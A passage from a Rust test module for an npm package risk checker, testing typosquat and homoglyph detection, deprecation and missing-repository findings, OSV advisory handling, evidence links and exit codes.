                "{publisher} should not be treated as a human publisher"
            );
        }
    }

    #[test]
    fn one_edit_typosquat_is_high_risk() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(finding(&findings, "typosquat").severity, Severity::High);
        assert_eq!(
            report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
            2
        );
    }

    #[test]
    fn two_edit_typosquat_is_a_warning() {
        let mut meta = meta();
        meta.name = "expreszz".to_string();
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(finding(&findings, "typosquat").severity, Severity::Warn);
        assert_eq!(
            report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
            1
        );
    }

    #[test]
    fn homoglyph_typosquat_is_high_risk() {
        let mut meta = meta();
        meta.name = "1odash".to_string();
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        let typosquat = finding(&findings, "typosquat");
        assert_eq!(typosquat.severity, Severity::High);
        assert!(typosquat.detail.contains("lookalike"));
    }

    #[test]
    fn deprecated_versions_are_a_warning() {
        let mut meta = meta();
        meta.deprecated = Some("use v2".to_string());
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(finding(&findings, "deprecated").severity, Severity::Warn);
    }

    #[test]
    fn missing_repository_is_only_info() {
        let mut meta = meta();
        meta.repository = None;
        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
        assert_eq!(ids(&findings), vec!["no-repository"]);
        assert_eq!(
            report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
            0
        );
    }

    #[test]
    fn every_finding_cites_evidence() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        meta.deprecated = Some("old".to_string());
        meta.repository = None;
        meta.publisher = Some("mallory".to_string());
        meta.install_scripts.push(InstallScript {
            name: "postinstall".to_string(),
            command: "node setup.js".to_string(),
        });
        for finding in assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW) {
            assert!(
                !finding.evidence.is_empty(),
                "finding {} has no evidence",
                finding.id
            );
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|evidence| evidence.url.is_some()),
                "finding {} has no link",
                finding.id
            );
        }
    }

    #[test]
    fn report_carries_registry_facts_through() {
        let mut meta = meta();
        meta.deprecated = Some("old".to_string());
        let report = report(
            meta,
            Ecosystem::Npm,
            Some(1234),
            None,
            &[],
            Profile::NPM,
            NOW,
        );
        assert_eq!(report.ecosystem, Ecosystem::Npm);
        assert_eq!(report.weekly_downloads, Some(1234));
        assert_eq!(report.maintainers, vec!["alice"]);
        assert_eq!(report.publisher.as_deref(), Some("alice"));
    }

    fn list(advisories: Vec<Advisory>) -> AdvisoryList {
        AdvisoryList {
            advisories,
            hidden: 0,
        }
    }

    fn advisory(id: &str, severity: Severity) -> Advisory {
        Advisory {
            id: id.to_string(),
            summary: "a real vulnerability".to_string(),
            severity,
            aliases: vec!["CVE-2000-0001".to_string()],
            url: format!("https://osv.dev/vulnerability/{id}"),
            fixed_versions: Vec::new(),
            details_missing: false,
        }
    }

    #[test]
    fn advisories_become_findings_with_links() {
        let advisories = [advisory("GHSA-aaaa", Severity::High)];
        let findings = advisory_findings(&advisories);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(findings[0].id, "advisory");
        assert!(findings[0].title.contains("GHSA-aaaa"));
        assert_eq!(
            findings[0].evidence[0].url.as_deref(),
            Some("https://osv.dev/vulnerability/GHSA-aaaa")
        );
    }

    #[test]
    fn a_high_advisory_exits_two() {
        let advisories = list(vec![advisory("GHSA-bbbb", Severity::High)]);
        let report = report(
            meta(),
            Ecosystem::Npm,
            None,
            Some(&advisories),
            &[],
            Profile::NPM,
            NOW,
        );
        assert_eq!(report.exit_code(), 2);
        assert_eq!(report.advisories.len(), 1);
    }

    #[test]
    fn hidden_advisories_are_disclosed() {
        let advisories = AdvisoryList {
            advisories: vec![advisory("GHSA-eeee", Severity::Warn)],
            hidden: 15,
        };
        let report = report(
            meta(),
            Ecosystem::Npm,
            None,
            Some(&advisories),
            &[],
            Profile::NPM,
            NOW,
        );
        let note = report
            .findings
            .iter()
            .find(|finding| finding.id == "advisories-truncated")
            .expect("truncation must be disclosed");
        assert_eq!(note.severity, Severity::Info);
        assert!(note.detail.contains("15 additional advisories"));
        assert_eq!(report.hidden_advisories, 15);
    }

    #[test]
    fn a_low_advisory_is_informational() {
        let advisories = list(vec![advisory("GHSA-cccc", Severity::Info)]);
        let report = report(
            meta(),
            Ecosystem::Npm,
            None,
            Some(&advisories),
            &[],
            Profile::NPM,
            NOW,
        );
        assert_eq!(report.exit_code(), 0);
    }

    #[test]
    fn an_unreachable_osv_is_flagged_but_does_not_fail_the_run() {
        let report = report(meta(), Ecosystem::Npm, None, None, &[], Profile::NPM, NOW);
        assert_eq!(report.exit_code(), 0);
        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.findings[0].id, "advisory-check-unavailable");
        assert_eq!(report.findings[0].severity, Severity::Info);
    }

    #[test]
    fn advisory_findings_sort_above_registry_findings_of_lower_severity() {
        let mut meta = meta();
        meta.repository = None; // INFO
        let advisories = list(vec![advisory("GHSA-dddd", Severity::High)]);
        let report = report(
            meta,
            Ecosystem::Npm,
            None,
            Some(&advisories),
            &[],
            Profile::NPM,
            NOW,
        );
        assert_eq!(report.findings[0].severity, Severity::High);
        assert_eq!(report.findings[0].id, "advisory");
    }
}
